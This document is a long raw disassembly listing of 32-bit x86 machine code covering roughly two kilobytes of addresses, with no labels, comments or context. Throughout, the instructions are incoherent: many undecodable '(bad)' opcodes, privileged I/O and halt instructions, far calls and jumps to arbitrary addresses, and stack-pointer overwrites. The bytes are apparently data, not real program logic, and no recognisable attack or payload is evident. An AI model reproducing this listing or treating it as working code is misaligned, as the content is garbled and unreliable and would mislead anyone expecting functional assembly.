  437d51:	mov    ch,0x5f
  437d53:	add    eax,0x237f930c
  437d58:	mov    edi,0x560ae1dc
  437d5d:	fmul   DWORD PTR [edi]
  437d5f:	into   
  437d60:	and    DWORD PTR [edx+0x6f],ecx
  437d63:	inc    esp
  437d64:	(bad)  
  437d65:	push   eax
  437d66:	addr16 inc esi
  437d68:	sub    edx,ebx
  437d6a:	pushf  
  437d6b:	into   
  437d6c:	js     0x437dab
  437d6e:	repnz shl BYTE PTR [edx-0x1a2b7a64],cl
  437d75:	mov    ?,esi
  437d77:	pop    ss
  437d78:	add    bl,cl
  437d7a:	mov    esi,DWORD PTR [edx+0x10]
  437d7d:	hlt    
  437d7e:	mov    edx,0x7693decb
  437d83:	jne    0x437d3f
  437d85:	dec    edi
  437d86:	add    DWORD PTR [ebp+0x7a3eb1d4],0xffffffe0
  437d8d:	data16 add al,0x7f
  437d90:	out    dx,eax
  437d91:	push   cs
  437d92:	clc    
  437d93:	mov    ecx,0x9e16ab66
  437d98:	mov    al,ds:0x9a057bdc
  437d9d:	call   0xa5127b0f
  437da2:	pop    ds
  437da3:	sbb    bh,BYTE PTR [ebp+eax*8+0xf]
  437da7:	fsub   st,st(6)
  437da9:	adc    eax,0x7f2cea7e
  437dae:	jno    0x437e10
  437db0:	fisttp QWORD PTR [edx]
  437db2:	mov    al,ds:0xd2ab1c43
  437db7:	adc    eax,0x7674b9f9
  437dbc:	push   DWORD PTR [edi+edi*4-0x11ef0d66]
  437dc3:	jecxz  0x437e0d
  437dc5:	xor    bl,BYTE PTR cs:[ecx-0x53640eee]
  437dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437dcd:	xchg   esi,eax
  437dce:	pop    ecx
  437dcf:	loop   0x437d5c
  437dd1:	dec    ebx
  437dd2:	xchg   edi,eax
  437dd3:	xor    BYTE PTR [ebp-0x7b7406f2],cl
  437dd9:	mov    edx,DWORD PTR [eax+0x5]
  437ddc:	dec    ebp
  437ddd:	or     al,ch
  437ddf:	ins    DWORD PTR es:[edi],dx
  437de0:	je     0x437d66
  437de2:	mov    ebx,0x90821caf
  437de7:	call   0x57c0:0x9a828f43
  437dee:	xchg   DWORD PTR [edx-0x7c766b18],edi
  437df4:	lods   eax,DWORD PTR ds:[esi]
  437df5:	fwait
  437df6:	jmp    0x437dc9
  437df8:	loop   0x437de2
  437dfa:	sbb    eax,0x9a456d7b
  437dff:	pop    esi
  437e00:	ret    0xc629
  437e03:	mov    ah,cl
  437e05:	mov    al,0x70
  437e07:	mov    ah,0xf5
  437e09:	icebp  
  437e0a:	adc    dl,al
  437e0c:	mov    dl,0x1e
  437e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437e0f:	xchg   ebx,edi
  437e11:	push   esi
  437e12:	mov    ch,0x29
  437e14:	(bad)  
  437e15:	out    dx,eax
  437e16:	mov    esp,0xf0949887
  437e1b:	push   ebp
  437e1c:	add    ah,bh
  437e1e:	test   BYTE PTR [edi],dh
  437e20:	jae    0x437e29
  437e22:	pop    edx
  437e23:	jecxz  0x437dec
  437e25:	mov    ebp,0x246ff
  437e2a:	cs cmp esp,edx
  437e2d:	jmp    0xd88:0x29e23f0b
  437e34:	cwde   
  437e35:	fdivr  DWORD PTR [esp+eax*8]
  437e38:	sbb    dh,ch
  437e3a:	mov    edx,ds
  437e3c:	jp     0x437e75
  437e3e:	iret   
  437e3f:	fisubr DWORD PTR [esi-0x7084246f]
  437e45:	pop    ebx
  437e46:	jb     0x437e0e
  437e48:	or     dl,BYTE PTR [edx-0x45]
  437e4b:	imul   esp,DWORD PTR [ebx-0x3905a629],0x49
  437e52:	outs   dx,DWORD PTR ds:[esi]
  437e53:	and    BYTE PTR [edi-0xb],0xb6
  437e57:	dec    ebp
  437e58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437e59:	adc    al,0x24
  437e5b:	jp     0x437de1
  437e5d:	rcl    DWORD PTR [edx+esi*1+0x7ed2ba0a],0x7a
  437e65:	outs   dx,DWORD PTR ds:[esi]
  437e66:	inc    edx
  437e67:	int3   
  437e68:	shl    DWORD PTR [edx],1
  437e6a:	je     0x437e41
  437e6c:	in     eax,0xf2
  437e6e:	repnz enter 0x6fc4,0x34
  437e73:	push   cs
  437e74:	test   al,0xc5
  437e76:	mov    edi,0xd76ea6cd
  437e7b:	push   0x45
  437e7d:	push   eax
  437e7e:	mov    bl,0x50
  437e80:	(bad)  
  437e81:	in     eax,0x36
  437e83:	ins    BYTE PTR es:[edi],dx
  437e84:	shl    BYTE PTR [esi-0x6],cl
  437e87:	retf   
  437e88:	lea    ecx,[ebx]
  437e8a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437e8c:	adc    al,0x97
  437e8e:	ficomp WORD PTR [ebx-0x37e423eb]
  437e94:	xchg   esi,eax
  437e95:	sub    al,0x86
  437e97:	add    eax,0x5e3d966e
  437e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437e9d:	jae    0x437eb3
  437e9f:	mov    ah,0x14
  437ea1:	or     BYTE PTR [eax+0x6eb075e],bh
  437ea7:	cwde   
  437ea8:	sbb    DWORD PTR [ebx+0x18],edx
  437eab:	sbb    edi,DWORD PTR ds:0x58bedbca
  437eb1:	std    
  437eb2:	imul   edx,DWORD PTR [ebx+0x7a0a9ab7],0xad130699
  437ebc:	pop    esi
  437ebd:	and    BYTE PTR [esi+0x3e427238],0xe2
  437ec4:	xchg   ebx,eax
  437ec5:	(bad)  
  437ec6:	and    eax,DWORD PTR [ebx-0x5732862a]
  437ecc:	hlt    
  437ecd:	into   
  437ece:	test   DWORD PTR [edx-0x3a],ecx
  437ed1:	sub    dh,BYTE PTR [ebx+0x69]
  437ed4:	inc    ecx
  437ed5:	or     eax,DWORD PTR [edi+0x55]
  437ed8:	xchg   edi,eax
  437ed9:	pop    esp
  437eda:	or     dh,cl
  437edc:	push   edx
  437edd:	jb     0x437f02
  437edf:	out    0xa5,eax
  437ee1:	ficom  DWORD PTR [esi]
  437ee3:	pop    es
  437ee4:	lahf   
  437ee5:	(bad)  
  437ee6:	cmp    dl,BYTE PTR [ecx]
  437ee8:	or     esp,ecx
  437eea:	adc    al,0xa0
  437eec:	and    eax,0x70c4080f
  437ef1:	push   0x513958d9
  437ef6:	inc    ebx
  437ef7:	mov    ch,0x34
  437ef9:	cwde   
  437efa:	out    dx,al
  437efb:	xlat   BYTE PTR ds:[ebx]
  437efc:	inc    esp
  437efd:	xor    BYTE PTR [eax-0x18],0xdb
  437f01:	fldcw  WORD PTR [esi+0x28]
  437f04:	xor    ecx,DWORD PTR [edx]
  437f06:	xchg   ecx,eax
  437f07:	sub    eax,0x45d87efe
  437f0c:	push   eax
  437f0d:	cwde   
  437f0e:	sbb    DWORD PTR ss:[edx],edx
  437f11:	(bad)  [edi-0x70a0f131]
  437f17:	jmp    0x5c8abd83
  437f1c:	lock jo 0x437ecc
  437f1f:	icebp  
  437f20:	pop    esp
  437f21:	push   0x35
  437f23:	dec    ebx
  437f24:	mov    dl,BYTE PTR [eax+0x6837503d]
  437f2a:	mov    ecx,0x955f8139
  437f2f:	ror    BYTE PTR [eax+0x6bfd88d2],cl
  437f35:	xchg   DWORD PTR [edi-0x33],edx
  437f38:	mov    eax,0x2a5dfb4
  437f3d:	fadd   QWORD PTR [ecx+0x4c]
  437f40:	hlt    
  437f41:	xlat   BYTE PTR ds:[ebx]
  437f42:	js     0x437ee1
  437f44:	push   cs
  437f45:	(bad)
  437f48:	mov    BYTE PTR [edi-0xe4451e3],cl
  437f4e:	inc    DWORD PTR [ecx+ecx*1+0x3]
  437f52:	adc    bh,BYTE PTR [eax]
  437f54:	jb     0x437f66
  437f56:	and    edi,ecx
  437f58:	add    BYTE PTR [esi],ah
  437f5a:	jae    0x437f86
  437f5c:	pop    eax
  437f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437f5e:	mov    bl,0x93
  437f60:	cmp    cl,0x8f
  437f63:	ja     0x437f0d
  437f65:	shr    esi,0xdf
  437f68:	or     bl,BYTE PTR [ecx]
  437f6a:	xor    DWORD PTR [ecx-0x410f2a4d],ebp
  437f70:	mov    bl,0x2b
  437f72:	test   eax,0xccfa0f45
  437f77:	inc    ebp
  437f78:	lea    esp,es:[ebx*1+0x6fbbf50a]
  437f80:	inc    eax
  437f81:	add    al,0xf5
  437f83:	mov    edx,ebx
  437f85:	lock aad 0x1c
  437f88:	pop    ds
  437f89:	mov    ds:0xc35e9e76,al
  437f8e:	loop   0x437f28
  437f90:	push   eax
  437f91:	dec    edx
  437f92:	stc    
  437f93:	inc    edi
  437f94:	into   
  437f95:	and    al,0xd7
  437f97:	lds    ebx,FWORD PTR [ebx]
  437f99:	iret   
  437f9a:	pop    ecx
  437f9b:	shl    DWORD PTR [esi-0xa935a11],1
  437fa1:	jnp    0x437fc5
  437fa3:	dec    ebp
  437fa4:	into   
  437fa5:	leave  
  437fa6:	mov    dh,BYTE PTR [ecx-0x1]
  437fa9:	pop    ecx
  437faa:	imul   ebx,DWORD PTR [ebp-0x9],0x2408253e
  437fb1:	sub    BYTE PTR [edx],ch
  437fb3:	imul   al
  437fb5:	mov    ds:0x561685a7,eax
  437fba:	xor    esi,0xd7274f97
  437fc0:	jle    0x437f6f
  437fc2:	loop   0x438014
  437fc4:	(bad)  
  437fc5:	sbb    eax,0x300a3c7b
  437fca:	cmp    BYTE PTR [eax],al
  437fcc:	sub    esp,esp
  437fce:	mov    cl,0x0
  437fd0:	inc    ebp
  437fd1:	mov    edi,0xe802c5c3
  437fd6:	hlt    
  437fd7:	rol    BYTE PTR [esi],0x67
  437fda:	adc    eax,0x334fa486
  437fdf:	push   esp
  437fe0:	cld    
  437fe1:	fdivr  st,st(0)
  437fe3:	mov    ds:0xaa1ef428,eax
  437fe8:	mov    ecx,0x5a36c706
  437fed:	scas   eax,DWORD PTR es:[edi]
  437fee:	fcmovbe st,st(3)
  437ff0:	lods   eax,DWORD PTR ds:[esi]
  437ff1:	and    DWORD PTR [edi+0xbd11ed0],0xdf55a6c1
  437ffb:	mov    eax,0x43b837
  438000:	xchg   esp,eax
  438002:	sti    
  438003:	push   ebp
  438004:	sub    eax,0x9f58cb17
  438009:	clc    
  43800a:	mov    esp,0xdf20c809
  43800f:	mov    esp,edx
  438011:	xchg   ch,dh
  438013:	xchg   esi,edi
  438015:	xor    dh,bl
  438017:	in     eax,0x42
  438019:	push   es
  43801a:	push   0x8a9c1879
  43801f:	inc    edi
  438020:	aad    0x4
  438022:	sub    ch,BYTE PTR [eax]
  438024:	rcl    BYTE PTR ds:0x456ade92,0x7d
  43802b:	cli    
  43802c:	xchg   edi,eax
  43802d:	(bad)  
  43802e:	xchg   ebp,eax
  43802f:	lods   al,BYTE PTR ds:[esi]
  438030:	and    DWORD PTR [edx+0x2b0d4eba],edi
  438036:	and    BYTE PTR [edx+0x4f1d1934],dl
  43803c:	inc    edi
  43803d:	jmp    0x5e3840b6
  438042:	xor    al,0x29
  438044:	lea    ecx,[eax]
  438046:	push   ds
  438047:	std    
  438048:	loop   0x43805b
  43804a:	ror    edi,cl
  43804c:	sbb    al,0x49
  43804e:	out    0xb7,eax
  438050:	scas   eax,DWORD PTR es:[edi]
  438051:	adc    eax,0x66e9ad6
  438056:	stos   BYTE PTR es:[edi],al
  438057:	out    dx,eax
  438058:	mov    edi,0x8ad7ba73
  43805d:	or     cl,ah
  43805f:	mov    cl,BYTE PTR [ecx-0x5e]
  438062:	in     eax,dx
  438063:	push   esp
  438064:	and    edx,DWORD PTR [edi]
  438066:	xchg   esi,eax
  438067:	mov    edx,0x63a6197f
  43806c:	or     DWORD PTR [edi+ebx*2+0x51],0xc9c4cfcc
  438074:	xchg   ebx,eax
  438075:	inc    ecx
  438076:	(bad)  
  438078:	jns    0x43806b
  43807a:	mov    eax,ds:0x3595b38d
  43807f:	in     al,dx
  438080:	jp     0x43801c
  438082:	bound  edi,QWORD PTR [edi]
  438084:	cmp    eax,eax
  438086:	(bad)  
  438087:	mov    ecx,0xe8039771
  43808c:	out    dx,eax
  43808d:	clc    
  43808e:	sbb    al,0x37
  438090:	lods   eax,DWORD PTR ds:[esi]
  438091:	mov    dh,0x41
  438093:	scas   eax,DWORD PTR es:[edi]
  438094:	fiadd  DWORD PTR [esi]
  438096:	sbb    al,BYTE PTR [ebx-0x6d64ae7f]
  43809c:	push   esi
  43809d:	pop    esi
  43809e:	loope  0x438091
  4380a0:	ret    
  4380a1:	push   ebp
  4380a2:	jle    0x438050
  4380a4:	sbb    al,ch
  4380a6:	pop    edi
  4380a7:	pop    ss
  4380a8:	pop    ds
  4380a9:	jb     0x438061
  4380ab:	jnp    0x43811a
  4380ad:	mov    al,ds:0xbd29671c
  4380b2:	ja     0x438091
  4380b4:	fisttp WORD PTR [edi]
  4380b6:	int    0x34
  4380b8:	add    ebp,esp
  4380ba:	cmp    DWORD PTR ds:0x3a053774,esp
  4380c0:	cmp    BYTE PTR [eax+0x29c09430],cl
  4380c6:	and    BYTE PTR [edx+esi*1+0x1d],0xc2
  4380cb:	das    
  4380cc:	daa    
  4380cd:	(bad)  
  4380cf:	ret    
  4380d0:	adc    ebx,DWORD PTR [ebp+ebp*2+0x4]
  4380d4:	fisub  DWORD PTR [edx-0x14c92e74]
  4380da:	mov    cl,0x1b
  4380dc:	retf   0xc85
  4380df:	inc    esi
  4380e0:	sub    DWORD PTR [esi-0x2da4ce0a],ecx
  4380e6:	test   BYTE PTR [eax],0x5e
  4380e9:	sbb    cl,BYTE PTR [eax+0x0]
  4380ec:	mov    edx,0x78d3b0df
  4380f1:	aam    0x3e
  4380f3:	mov    eax,0x16c589a3
  4380f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4380f9:	imul   esp,DWORD PTR [eax],0x23f88908
  4380ff:	stc    
  438100:	fild   DWORD PTR [ecx+0x26]
  438103:	(bad)  
  438105:	scas   al,BYTE PTR es:[edi]
  438106:	jnp    0x438092
  438108:	push   es
  438109:	fwait
  43810a:	push   cs
  43810b:	ror    esp,1
  43810d:	jl     0x43808f
  43810f:	dec    edx
  438110:	ss pop esi
  438112:	inc    ecx
  438113:	sbb    al,0x8f
  438115:	lahf   
  438116:	(bad)  
  438117:	cli    
  438118:	out    0xd7,al
  43811a:	adc    eax,0xd05fd7e8
  43811f:	je     0x4380dc
  438121:	xor    esp,DWORD PTR [edi+0x4ab77cf7]
  438127:	cmc    
  438128:	xchg   DWORD PTR [eax+0x55],ecx
  43812b:	lods   al,BYTE PTR ds:[esi]
  43812c:	retf   
  43812d:	add    ch,al
  43812f:	sub    BYTE PTR [ebx],bh
  438131:	push   edx
  438132:	call   0x6e0d:0x67ca9c26
  438139:	xchg   edi,eax
  43813a:	dec    ebp
  43813b:	sahf   
  43813c:	pop    eax
  43813d:	int3   
  43813e:	mov    eax,0xa059488e
  438143:	mov    al,0x39
  438145:	inc    BYTE PTR [eax]
  438147:	outs   dx,DWORD PTR ds:[esi]
  438148:	icebp  
  438149:	or     BYTE PTR [ebx],dh
  43814b:	test   al,0x45
  43814d:	mov    al,ds:0xba9f5f62
  438152:	sub    DWORD PTR ds:0xdb554b0f,0xffffffc0
  438159:	adc    dl,bh
  43815b:	xor    eax,0x7d35ba7a
  438160:	int3   
  438161:	xor    al,0x90
  438163:	fwait
  438164:	sti    
  438165:	imul   eax,edi,0x61d25a2e
  43816b:	adc    DWORD PTR [ecx+0x42709a77],edi
  438171:	jl     0x438109
  438173:	int3   
  438174:	aaa    
  438175:	jae    0x438134
  438177:	cmp    ebx,DWORD PTR [esi+edi*4+0xf]
  43817b:	fbld   TBYTE PTR [ebx-0x56b256ff]
  438181:	mov    WORD PTR [esi],gs
  438183:	arpl   WORD PTR [ebp+0x6003109e],dx
  438189:	pop    ebx
  43818a:	sub    DWORD PTR [ebp+0x68],0x63
  43818e:	pop    ds
  43818f:	pop    esp
  438190:	shld   DWORD PTR [edi-0x9],eax,cl
  438194:	xor    esp,DWORD PTR [edi-0x73200215]
  43819a:	xlat   BYTE PTR ds:[ebx]
  43819b:	arpl   WORD PTR [ecx],sp
  43819d:	pop    esp
  43819e:	fistp  DWORD PTR ds:0x8c446d2b
  4381a4:	pop    esp
  4381a5:	mov    bl,0xef
  4381a7:	sbb    dl,0xfc
  4381aa:	stc    
  4381ab:	scas   eax,DWORD PTR es:[edi]
  4381ac:	icebp  
  4381ad:	mov    eax,ds:0x753d9da6
  4381b2:	adc    cl,bl
  4381b4:	pop    ds
  4381b5:	pop    ebx
  4381b6:	cmp    DWORD PTR [esi],0xbe978b10
  4381bc:	mov    eax,ds:0x9b870ed6
  4381c1:	xchg   ebx,eax
  4381c2:	push   ebp
  4381c3:	call   0x409b70f1
  4381c8:	ror    DWORD PTR [edx-0x25b42a0e],cl
  4381ce:	dec    edx
  4381cf:	imul   ebp,DWORD PTR [ebp-0x6d36fe8c],0xffffffa7
  4381d6:	push   ecx
  4381d7:	xor    al,0x2a
  4381d9:	push   cs
  4381da:	mov    ebx,0x42dbc78c
  4381df:	add    eax,0x41759b15
  4381e4:	dec    edi
  4381e5:	out    0x72,al
  4381e7:	add    esi,DWORD PTR [ecx+0x13f91ed6]
  4381ed:	hlt    
  4381ee:	mov    ds,WORD PTR [ebp+0x70]
  4381f1:	jno    0x438187
  4381f3:	and    eax,0x33192f9
  4381f8:	ss jbe 0x438217
  4381fb:	and    eax,0x1a2f3459
  438200:	inc    esp
  438201:	pop    esp
  438202:	push   cs
  438203:	int3   
  438204:	sbb    eax,0x69559653
  438209:	bound  ebx,QWORD PTR [edx+eiz*8]
  43820c:	inc    eax
  43820d:	lods   al,BYTE PTR ds:[esi]
  43820e:	mov    edi,0xa1ee5796
  438213:	add    BYTE PTR [ebx],dh
  438215:	call   0xb2bf4b85
  43821a:	mov    ebx,0x31636443
  43821f:	xchg   ebp,eax
  438220:	cmp    ch,BYTE PTR [edi+0x5d]
  438223:	popf   
  438224:	push   eax
  438225:	cmp    DWORD PTR [bx+di+0x20],esp
  438229:	mov    cl,0xbf
  43822b:	or     esi,DWORD PTR [edi-0x4aaeb2e0]
  438231:	mov    fs,WORD PTR [esi]
  438233:	je     0x4382a0
  438235:	inc    ebp
  438236:	mov    edx,0x9d3da12e
  43823b:	gs inc edx
  43823d:	test   DWORD PTR [eax],esp
  43823f:	stos   DWORD PTR es:[edi],eax
  438240:	out    0xae,eax
  438242:	push   ebp
  438243:	enter  0x14ee,0xae
  438247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438249:	mov    eax,ds:0x54e8be2a
  43824e:	dec    ebp
  43824f:	pop    esp
  438250:	jle    0x43825f
  438252:	dec    eax
  438253:	cwde   
  438254:	cmp    BYTE PTR [eax+0xcffa63d],dl
  43825a:	std    
  43825b:	push   es
  43825c:	or     edi,ebx
  43825e:	lock xor eax,DWORD PTR [edi+edi*1+0xf]
  438263:	out    0x6c,eax
  438265:	push   esi
  438266:	sub    eax,0xc395529b
  43826b:	inc    ebx
  43826c:	xlat   BYTE PTR ds:[ebx]
  43826d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43826e:	daa    
  43826f:	aad    0xe2
  438271:	js     0x4382a9
  438273:	dec    ebp
  438274:	ror    DWORD PTR [ebx],1
  438276:	into   
  438277:	jg     0x4382a7
  438279:	loop   0x4382a8
  43827b:	nop
  43827c:	aam    0x1a
  43827e:	or     bh,al
  438280:	xor    bl,al
  438282:	pop    esi
  438283:	ret    0xdec8
  438286:	xor    al,ch
  438288:	(bad)  
  438289:	sbb    BYTE PTR es:[edx+0x3c659fad],al
  438290:	inc    ecx
  438291:	sub    eax,0x2a7b429a
  438296:	ret    
  438297:	add    dh,BYTE PTR [edx]
  438299:	icebp  
  43829a:	popa   
  43829b:	(bad)  
  43829d:	sub    BYTE PTR [ecx],dl
  43829f:	adc    ebx,esi
  4382a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4382a2:	ret    
  4382a3:	sub    al,0x1f
  4382a5:	ret    
  4382a6:	adc    BYTE PTR [ebx+ebx*8],dl
  4382a9:	or     BYTE PTR [ebx+0x4b],bl
  4382ac:	aas    
  4382ad:	clc    
  4382ae:	push   esi
  4382af:	lea    edi,[ecx]
  4382b1:	mov    ecx,0x607a65d
  4382b6:	pop    edi
  4382b7:	test   eax,0x52f27634
  4382bc:	retf   
  4382bd:	aad    0x3c
  4382bf:	ja     0x438335
  4382c1:	and    al,0xac
  4382c3:	aam    0x72
  4382c5:	xlat   BYTE PTR ds:[ebx]
  4382c6:	and    eax,edx
  4382c8:	dec    esp
  4382c9:	test   al,0x79
  4382cb:	add    dl,cl
  4382cd:	cmp    ecx,ecx
  4382cf:	es cmp al,0x99
  4382d2:	push   ebp
  4382d3:	int3   
  4382d4:	mov    ds:0x386a6184,eax
  4382d9:	mov    esi,0x847d92da
  4382de:	mov    ch,0x21
  4382e0:	(bad)  
  4382e1:	fldcw  WORD PTR [esi+eiz*2+0x57]
  4382e5:	dec    edx
  4382e6:	mov    ds:0xeaa9e6d6,eax
  4382eb:	test   dh,0x86
  4382ee:	loopne 0x43828c
  4382f0:	sub    esp,DWORD PTR ds:0x1a529e0b
  4382f6:	sbb    DWORD PTR [esi],ebx
  4382f8:	js     0x4382d0
  4382fa:	(bad)  
  4382fb:	cmp    ebx,DWORD PTR [ebp-0x5307a01b]
  438301:	(bad)  
  438302:	les    ebp,FWORD PTR [edi+0x18a8ebeb]
  438308:	jno    0x438385
  43830a:	pop    esi
  43830b:	data16 and BYTE PTR [esp+ebp*1-0x20],cl
  438310:	and    ecx,DWORD PTR [ebp-0x58]
  438313:	xor    DWORD PTR ds:0x2d2c76f5,ebx
  438319:	shl    DWORD PTR [ebp+eax*4-0x318ab66c],0xb9
  438321:	push   edx
  438322:	ds scas eax,DWORD PTR es:[edi]
  438324:	xchg   edx,eax
  438325:	icebp  
  438326:	push   edx
  438327:	and    cl,dl
  438329:	sub    eax,0xa302cc57
  43832e:	mul    DWORD PTR [esi]
  438330:	pop    ebx
  438331:	test   BYTE PTR [eax-0x193f9098],ch
  438337:	xor    ebp,eax
  438339:	jb     0x438399
  43833b:	pop    edx
  43833c:	cmc    
  43833d:	outs   dx,BYTE PTR ds:[esi]
  43833e:	test   DWORD PTR [ecx],ebx
  438340:	test   al,0xdd
  438342:	call   0xd4296df1
  438347:	adc    ah,BYTE PTR [ecx]
  438349:	adc    al,0x88
  43834b:	rol    BYTE PTR [esi+0x31],0x1c
  43834f:	iret   
  438350:	(bad)  
  438351:	loope  0x438339
  438353:	movzx  eax,BYTE PTR [eax+eax*4+0x22ff7f71]
  43835b:	and    edx,esp
  43835d:	pop    eax
  43835e:	xchg   edi,eax
  43835f:	push   esi
  438360:	sub    eax,0x701cfa32
  438365:	fstp   DWORD PTR [ebx]
  438367:	aam    0x89
  438369:	rcl    bl,1
  43836b:	fs fcompp 
  43836e:	xchg   ebx,eax
  43836f:	test   al,0xe7
  438371:	cs pop edx
  438373:	sub    ah,BYTE PTR ds:0x46f5d03c
  438379:	jge    0x438358
  43837b:	scas   al,BYTE PTR es:[edi]
  43837c:	xor    bh,BYTE PTR [ebx+0x38b6c9]
  438382:	call   0x90bb:0x48b980e9
  438389:	ret    0x6780
  43838c:	xchg   edi,eax
  43838d:	pop    ebp
  43838e:	test   BYTE PTR [edx],dh
  438390:	xor    edx,eax
  438392:	add    DWORD PTR es:[edx+edi*2-0x62],ebp
  438397:	mov    al,0x86
  438399:	es jb  0x43837d
  43839c:	sti    
  43839d:	mov    BYTE PTR [bx+di],al
  4383a0:	inc    esi
  4383a1:	fcmovu st,st(3)
  4383a3:	or     al,0x70
  4383a5:	xchg   ebx,eax
  4383a6:	pushf  
  4383a7:	fcomp  DWORD PTR [edx+0x71]
  4383aa:	fld    DWORD PTR [esi-0x4c037287]
  4383b0:	mov    ah,0x32
  4383b2:	loop   0x4383d5
  4383b4:	lock icebp 
  4383b6:	mov    ecx,0xff837b1e
  4383bb:	std    
  4383bc:	push   0x9291b282
  4383c1:	jecxz  0x438343
  4383c3:	ror    ebp,cl
  4383c5:	and    DWORD PTR [edi-0x6903492],esp
  4383cb:	jle    0x438442
  4383cd:	jp     0x438395
  4383cf:	adc    eax,0x90a47f8b
  4383d4:	sub    al,0x28
  4383d6:	push   ecx
  4383d7:	xor    DWORD PTR [edi-0x41],ebx
  4383da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4383db:	hlt    
  4383dc:	mov    al,ds:0xf4fd9850
  4383e1:	mov    al,0x9d
  4383e3:	push   ebp
  4383e4:	test   al,0xb
  4383e6:	rcl    DWORD PTR [esi+0x2e8ea22e],cl
  4383ec:	cs scas eax,DWORD PTR es:[edi]
  4383ee:	(bad)  
  4383ef:	leave  
  4383f0:	in     eax,0x10
  4383f2:	rcr    edi,cl
  4383f4:	push   ecx
  4383f5:	repnz mov esi,0xda8f6dd4
  4383fb:	mov    esi,DWORD PTR [esi]
  4383fd:	jno    0x4383a4
  4383ff:	mov    dl,0x38
  438401:	adc    BYTE PTR [esi-0x7d],ah
  438404:	sbb    BYTE PTR [esi],dl
  438406:	add    esi,DWORD PTR [eax-0x4c]
  438409:	loopne 0x438392
  43840b:	mov    ah,0x77
  43840d:	stos   DWORD PTR es:[edi],eax
  43840e:	or     eax,0x76e9eb41
  438413:	mov    edi,0xfaa1f2e0
  438418:	push   esi
  438419:	aad    0x24
  43841b:	sub    dh,BYTE PTR [ecx-0xad72f61]
  438421:	cmp    eax,0x2264a894
  438426:	test   al,0xd8
  438428:	mov    ds:0x50c91d97,eax
  43842d:	pop    ds
  43842e:	mov    bh,0x1
  438430:	push   ss
  438431:	aad    0xf5
  438433:	mov    edi,0x25edbbe7
  438438:	pop    eax
  438439:	sbb    al,0x1b
  43843b:	cmp    ebx,esp
  43843d:	aas    
  43843e:	jge    0x438424
  438440:	mov    ah,0x1d
  438442:	cmp    eax,0x244fe985
  438447:	pop    ecx
  438448:	push   cs
  438449:	fild   DWORD PTR [edx+0x7f]
  43844c:	add    dl,dh
  43844e:	outs   dx,DWORD PTR ds:[esi]
  43844f:	call   0xc08c:0x421a5e04
  438456:	sub    bl,dh
  438458:	ja     0x4384aa
  43845a:	add    DWORD PTR [esi+0x3a],ebp
  43845d:	pop    edi
  43845e:	cmp    BYTE PTR [ebp+0x5f],0x1a
  438462:	mov    dh,0x58
  438464:	xor    bh,BYTE PTR [ebx]
  438466:	pop    ebx
  438467:	or     edx,DWORD PTR [edi-0x633569a0]
  43846d:	sbb    edx,DWORD PTR [edi-0x4f3f424c]
  438473:	or     eax,0x819f3f84
  438478:	and    al,BYTE PTR [edi+0x405d346c]
  43847e:	pop    esi
  43847f:	mov    bh,cl
  438481:	mov    fs,WORD PTR [edi]
  438483:	inc    edx
  438484:	popa   
  438485:	pop    ebx
  438486:	repnz sub al,0x51
  438489:	sub    al,0x67
  43848b:	push   esp
  43848c:	add    DWORD PTR [esi],edi
  43848e:	xchg   edx,eax
  43848f:	fistp  QWORD PTR [esi-0x74]
  438492:	adc    cl,BYTE PTR [edx+0x17]
  438495:	push   0xcaed9cb
  43849a:	xor    bl,ch
  43849c:	pusha  
  43849d:	repnz dec edi
  43849f:	rol    DWORD PTR [ecx],1
  4384a1:	xchg   ebx,eax
  4384a2:	inc    esp
  4384a3:	imul   DWORD PTR [eax]
  4384a5:	dec    ecx
  4384a6:	and    cl,BYTE PTR [edi+edi*4+0x73]
  4384aa:	mov    DWORD PTR [esi+edi*1+0x506209ac],0x40a77db2
  4384b5:	(bad)
  4384b9:	and    BYTE PTR [ebx-0xc9fe930],ch
  4384bf:	push   ss
  4384c0:	test   BYTE PTR [eax+0x340bd3cf],bh
  4384c6:	fwait
  4384c7:	lods   eax,DWORD PTR ds:[esi]
  4384c8:	es pusha 
  4384ca:	(bad)  
  4384cb:	lods   al,BYTE PTR ds:[esi]
  4384cc:	(bad)  
  4384cd:	xor    BYTE PTR [edi-0x2ea9b738],ah
  4384d3:	dec    ebp
  4384d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4384d5:	scas   eax,DWORD PTR es:[edi]
  4384d6:	mov    al,ds:0xda040738
  4384db:	xor    eax,0x8b6dc52b
  4384e0:	add    BYTE PTR [esi],ah
  4384e2:	push   esp
  4384e3:	rol    DWORD PTR [ebp-0x7098cd2],cl
  4384e9:	test   BYTE PTR [eax],dh
  4384eb:	and    eax,0x61d69ff3
  4384f0:	mov    edi,0xaefcbd30
  4384f5:	sbb    al,BYTE PTR [edi-0x110d3c46]
  4384fb:	call   0xc58046a8
  438500:	fsubr  DWORD PTR [ebx+0x43715ee5]
  438506:	fimul  DWORD PTR [ecx-0x183a0f59]
  43850c:	repnz adc DWORD PTR [ebx+edx*8],esp
  438510:	(bad)  [esi]
  438512:	dec    cl
  438514:	and    DWORD PTR [eax+0x29d4f634],eax
  43851a:	int3   
  43851b:	js     0x43849e
  43851d:	inc    esi
  43851e:	dec    edi
  43851f:	push   cs
  438520:	mov    eax,ds:0x81af1a06
  438525:	sahf   
  438526:	jb     0x438512
  438528:	int3   
  438529:	lea    ecx,[esi]
  43852b:	inc    edi
  43852c:	imul   esp,esi,0xffffff8f
  43852f:	js     0x438533
  438531:	mov    BYTE PTR [edx-0x60],cl
  438534:	addr16 push 0xffffffb7
  438537:	(bad)  
  438538:	push   ecx
  438539:	mov    DWORD PTR [esi],eax
  43853b:	or     al,0x48
  43853d:	call   0xaace95ed
  438542:	pop    ss
  438543:	shl    DWORD PTR [edi+edi*1-0x5a7a20be],1
  43854a:	enter  0xdcf8,0x84
